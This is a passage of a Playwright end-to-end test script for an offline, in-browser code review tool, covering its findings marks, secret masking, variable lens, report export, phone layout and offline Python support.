    await p.locator('[data-line="3"]').waitFor({ timeout: 30000 });
    const marks = [];
    for (const n of [2, 3, 15, 16, 17, 20, 21]) if ((await p.locator(`[data-line="${n}"] [data-testid="finding-mark"]`).count()) === 1) marks.push(n);
    check('findings: ⚠ marks on unused import, secret, unused variable, empty catch, ==, TODO and empty body', marks.length === 7, marks.join(','));
    check('secrets: masked in the code view (the key is nowhere on the page)', !(await p.locator('main').innerText()).includes(KEY5) && /sk_l•+/.test(await p.locator('[data-line="3"] [data-testid="secret"]').innerText()));
    await p.locator('[data-line="3"] [data-testid="reveal"]').click();
    const shown = (await p.locator('[data-line="3"]').innerText()).includes(KEY5);
    await p.locator('[data-line="3"] [data-testid="reveal"]').click();
    check('secrets: "show" reveals that one string, "hide" masks it again', shown && !(await p.locator('[data-line="3"]').innerText()).includes(KEY5));
    await p.locator('[data-line="16"] .ln').click();
    const lf = await p.locator('.right-pane').getByTestId('line-findings').innerText();
    check('tap a flagged line: finding with rule, evidence and certainty', /Broad or empty catch[\s\S]*catch\.empty[\s\S]*certain/.test(lf), lf);
    await p.keyboard.press('Escape');

    // lens: variable
    await p.getByTestId('lens-toggle').click();
    await p.locator('[data-line="6"] .tok', { hasText: 'sum' }).click();
    const letter = async (n) => ((await p.locator(`[data-line="${n}"] .lens-letter`).count()) ? (await p.locator(`[data-line="${n}"] .lens-letter`).innerText()).trim() : '');
    const bar = await p.getByTestId('lens-bar').innerText();
    check('lens: tapping a variable marks its reads and writes (W / RW / R)', (await letter(6)) === 'W' && (await letter(8)) === 'RW' && (await letter(10)) === 'R', `${await letter(6)} ${await letter(8)} ${await letter(10)}`);
    check('lens: a same-named variable in another function is not lit (scope-aware)', (await letter(14)) === '' && (await letter(18)) === '' && (await p.locator('[data-line="14"]').getAttribute('class')).includes('lens-dim'));
    check('lens: the bar says what it found and how sure it is', /sum[\s\S]*1 read[\s\S]*certain/.test(bar), bar);
    // lens: function
    await p.locator('[data-line="13"] .ln').click();
    const fbar = await p.getByTestId('lens-bar').innerText();
    check('lens: tapping a function shows its callers and callees, the rest dimmed', /count\(\)[\s\S]*Everything else in this file is dimmed/.test(fbar) && /readFile\(\) \(src\/util\.js\)/.test(fbar) && (await p.locator('[data-line="6"]').getAttribute('class')).includes('lens-dim') && !(await p.locator('[data-line="16"]').getAttribute('class')).includes('lens-dim'), fbar);
    await p.keyboard.press('Escape');
    check('lens: Esc clears it', /Lens on: tap a name/.test(await p.getByTestId('lens-bar').innerText()) && (await p.locator('.lens-dim').count()) === 0);
    await p.getByTestId('lens-toggle').click();

    // review progress
    await nav.getByRole('button', { name: 'Queue' }).click();
    const first = p.getByTestId('queue-item').first();
    await first.getByTestId('reviewed').check();
    await first.getByRole('button', { name: 'Add note' }).click();
    await first.getByTestId('review-note').fill('checked the catch');
    await first.getByTestId('review-note').press('Enter');
    await first.getByTestId('review-note').blur();
    const prog = await p.getByTestId('review-progress').innerText();
    check('review progress: ticking a function raises the risk-weighted % reviewed', /^[1-9]\d*%/.test(prog.trim()) && /1 of \d+ functions/.test(prog), prog);

    // report
    await nav.getByRole('button', { name: 'Report' }).click();
    await p.getByTestId('report').waitFor();
    const rep = await p.getByTestId('report').innerText();
    check('report tab: findings by check with rule and certainty, progress, notes', /Possible hardcoded secret/.test(rep) && /Broad or empty catch/.test(rep) && /secret\.stripe-key/.test(rep) && /checked the catch/.test(rep) && !rep.includes(KEY5), rep.slice(0, 300));
    const md1 = await readDownload(p, 'download-md');
    check('#12 Markdown export: no code by default and the secret is masked', !md1.includes(KEY5) && !md1.includes('readFile(STRIPE)') && !md1.includes('let sum = 0') && /sk_l••••/.test(md1) && /no source code in this report/.test(md1), md1.slice(0, 300));
    await p.getByTestId('excerpts').check();
    const md2 = await readDownload(p, 'download-md');
    check('#12 with "Include code excerpts": code appears, the secret is still masked', md2.includes('try { readFile(STRIPE); } catch (e) {}') && !md2.includes(KEY5) && md2.includes('const STRIPE = "sk_l'), md2.slice(0, 300));
    await p.emulateMedia({ media: 'print' });
    const printOk = await p.evaluate(() => getComputedStyle(document.querySelector('header.nav')).display === 'none' && getComputedStyle(document.querySelector('.actions')).display === 'none' && !!document.querySelector('[data-testid="report"]').offsetHeight);
    await p.screenshot({ path: path.join(ROOT, '..', '..', 'docs', 'phase5-print.png'), fullPage: true });
    await p.emulateMedia({ media: 'screen' });
    check('print / Save as PDF: only the report prints (nav and buttons hidden)', printOk);
    await p.close();
  }
  // Python: findings, masking and lens
  {
    const p = await ctx.newPage();
    await p.goto(APP);
    await p.getByTestId('file-input').setInputFiles([file('cfg.py', `import os\nTOKEN = "${KEY5}"\n\ndef load(path, cache={}):\n    data = None\n    try:\n        data = open(path).read()\n    except:\n        pass\n    return data\n\ndef other():\n    data = 1\n    return data\n`)]);
    await p.getByRole('button', { name: 'Review this code' }).click();
    await p.locator('nav.inline').getByRole('button', { name: 'Code' }).click();
    const consent = p.getByRole('button', { name: 'Download Python support' });
    await Promise.race([consent.waitFor({ timeout: 60000 }).then(() => consent.click()).catch(() => {}), p.locator('[data-line="2"]').waitFor({ timeout: 60000 })]);
    await p.locator('[data-line="2"]').waitFor({ timeout: 60000 });
    const pm = [];
    for (const n of [1, 2, 4, 8]) if ((await p.locator(`[data-line="${n}"] [data-testid="finding-mark"]`).count()) === 1) pm.push(n);
    check('Python findings: unused import, secret, mutable default, bare except', pm.length === 4, pm.join(','));
    check('Python secret masked in the code view', !(await p.locator('main').innerText()).includes(KEY5));
    await p.getByTestId('lens-toggle').click();
    await p.locator('[data-line="5"] .tok', { hasText: 'data' }).click();
    const lit = await p.locator('.row.lens-hit').evaluateAll((els) => els.map((e) => e.getAttribute('data-line')).join(','));
    check('Python lens: only load()\'s `data` lights up, not other()\'s', lit === '5,7,10', lit);
    await p.close();
  }
  // phone: Report and lens fit
  {
    const p = await ctx.newPage();
    await p.setViewportSize({ width: 360, height: 740 });
    await p.goto(APP);
    await p.getByTestId('file-input').setInputFiles([file('src/pay.js', PAY), file('src/util.js', UTIL)]);
    await p.getByRole('button', { name: 'Review this code' }).click();
    const nav = p.locator('nav.tabbar:not(.inline)');
    await nav.getByRole('button', { name: 'Report' }).click();
    await p.getByTestId('report').waitFor({ timeout: 30000 });
    const o1 = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', 'phone-report.png'), fullPage: true });
    await nav.getByRole('button', { name: 'Code' }).click();
    await p.getByTestId('lens-toggle').click();
    await p.locator('[data-line="6"] .tok', { hasText: 'sum' }).click();
    const o2 = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    check('phone: Report and the lens have no horizontal scroll', o1 <= 0 && o2 <= 0, `${o1}/${o2}px`);
    await p.close();
  }

  // ---- phone width, both themes: no horizontal scroll
  for (const theme of ['light', 'dark']) {
    const p = await ctx.newPage();
    await p.setViewportSize({ width: 360, height: 740 });
    await p.goto(APP);
    await p.evaluate((t) => (document.documentElement.dataset.theme = t), theme);
    const overflow = [];
    for (const tab of ['Input', 'Queue', 'Code', 'Tests', 'Report']) {
      await p.locator('nav.tabbar:not(.inline)').getByRole('button', { name: tab }).click();
      const over = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
      if (over > 0) overflow.push(`${tab}: ${over}px`);
    }
    await p.locator('nav.tabbar:not(.inline)').getByRole('button', { name: 'Input' }).click();
    check(`no horizontal scroll at 360px on every tab (${theme})`, overflow.length === 0, overflow.join(', '));
    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', `phone-${theme}.png`), fullPage: true });
    await p.close();
  }

  // ---- offline after first load
  await page.evaluate(() => navigator.serviceWorker.ready);
  await page.reload(); // make sure the page is controlled
  await page.waitForFunction(() => !!navigator.serviceWorker.controller, null, { timeout: 15000 });
  await new Promise((r) => server.close(r));
  await ctx.setOffline(true);
  await page.reload();
  check('works offline after first load (server stopped + offline)', await page.getByRole('heading', { name: 'Review some code' }).isVisible());
  // Python offline, using the Pyodide copy the service worker stored earlier
  await page.locator('#paste').fill(PY_SRC);
  await page.getByRole('button', { name: 'Review this code' }).click();
  await page.locator('nav.inline').getByRole('button', { name: 'Code' }).click();
  await page.getByTestId('file-select').waitFor({ timeout: 60000 }).catch(() => {});
  check('Python analysis works offline (no consent prompt the second time)', (await page.getByRole('button', { name: 'Download Python support' }).count()) === 0 && (await page.locator('[data-line="8"] .letter').count()) === 1);
  // Python TESTS offline too (Pyodide + wheels from the service-worker cache)
  {
    const p = await ctx.newPage();
    await p.goto(APP);
    await p.getByTestId('file-input').setInputFiles([file('calc.py', PY_CALC), file('test_calc.py', PY_TEST)]);
    await p.getByRole('button', { name: 'Review this code' }).click();
    await p.locator('nav.inline').getByRole('button', { name: 'Tests' }).click();
    await p.getByRole('button', { name: /^Run tests/ }).click();
    await p.getByTestId('test-summary').waitFor({ timeout: 120000 }).catch(() => {});
    const txt = await p.locator('main').innerText();
    check('Python tests run offline after first use', /1 passed/.test(txt) && /1 failed/.test(txt), txt.slice(0, 300));
    await p.close();
  }
  await ctx.setOffline(false);

  check('no CSP violations (pages and workers)', cspViolations.length === 0, cspViolations.join(' | '));
  check('no uncaught page errors', pageErrors.length === 0, pageErrors.join(' | '));
  const foreign = requests.filter((u) => !u.startsWith(APP) && !u.startsWith('blob:') && !u.startsWith('data:'));
  check('zero requests to any other origin', foreign.length === 0, foreign.join(', '));
} catch (e) {
  check('e2e run completed', false, String(e && e.stack || e).slice(0, 600));
  for (const pg of ctx.pages()) { try { console.log('PAGE TEXT:', (await pg.locator('main').innerText()).slice(0, 700)); } catch {} }
} finally {
  await browser.close();
  server.close?.();
  sink.close();
}
const failed = results.filter((r) => !r.pass);
console.log(`\n${results.length - failed.length}/${results.length} passed`);
fs.writeFileSync(path.join(ROOT, '..', 'tests', 'e2e', 'last-run.json'), JSON.stringify({ at: new Date().toISOString(), results }, null, 2));
process.exit(failed.length ? 1 : 0);
